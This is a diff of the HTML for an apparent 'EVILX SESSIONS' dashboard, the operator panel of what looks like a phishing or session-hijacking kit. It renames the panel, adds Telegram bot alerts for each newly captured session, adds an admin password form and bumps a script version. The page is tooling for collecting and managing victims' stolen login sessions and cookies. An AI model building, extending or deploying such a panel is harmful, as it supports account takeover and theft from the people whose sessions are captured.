@@ -206,7 +206,7 @@
 	<nav class="navbar">
 		<div class="navbar-left">
 			<img src="/img/cookie.png" alt="Logo" class="navbar-logo" />
-			<span class="navbar-title">𝗫𝗩𝗘𝗥𝗚𝗜𝗡𝗜𝗔 SESSIONS 𝗗𝗔𝗦𝗛𝗕𝗢𝗔𝗥𝗗</span>
+			<span class="navbar-title">EVILX SESSIONS 𝗗𝗔𝗦𝗛𝗕𝗢𝗔𝗥𝗗</span>
 		</div>
 		<div class="navbar-right">
 			<button id="settingsToggle">
@@ -297,12 +297,36 @@
 <div id="settingsOverlay" class="overlay hidden">
   <div class="overlay-content">
     <h2 class="settings-title">⚙️ Settings</h2>
-    <!-- Settings Form Removed for brevity in this Go port -->
+    <div class="settings-section">
+      <h3>📤 Telegram Notifications</h3>
+      <p style="font-size: 0.85rem; color: #666; margin-bottom: 15px;">
+        Receive instant alerts on your Telegram bot when a new session is captured.
+      </p>
+      <div class="form-row">
+        <input type="text" id="chatId" placeholder="Telegram Chat ID (e.g. 12345678)" />
+        <input type="password" id="botToken" placeholder="Telegram Bot Token" />
+      </div>
+      <button class="btn-save" onclick="saveTelegramSettings()">
+        <i class="ri-save-line"></i> Save Telegram Config
+      </button>
+    </div>
+
+    <!-- Optional: Password Change Section -->
+    <div class="settings-section">
+      <h3>🔐 Admin Password</h3>
+      <div class="form-row">
+        <input type="password" id="oldPassword" placeholder="Current Password" />
+        <input type="password" id="newPassword" placeholder="New Password" />
+      </div>
+      <button class="btn-save" style="background-color: #0984e3;" onclick="savePasswordChange()">
+        Update Password
+      </button>
+    </div>
   </div>
 </div>
 </div>
 <div id="notify" class="notify hidden"></div>
-<script src="js/main.js"></script>
+<script src="js/main.js?v=1.0.1"></script>
 
 <script>
 // Dynamic Session Render!
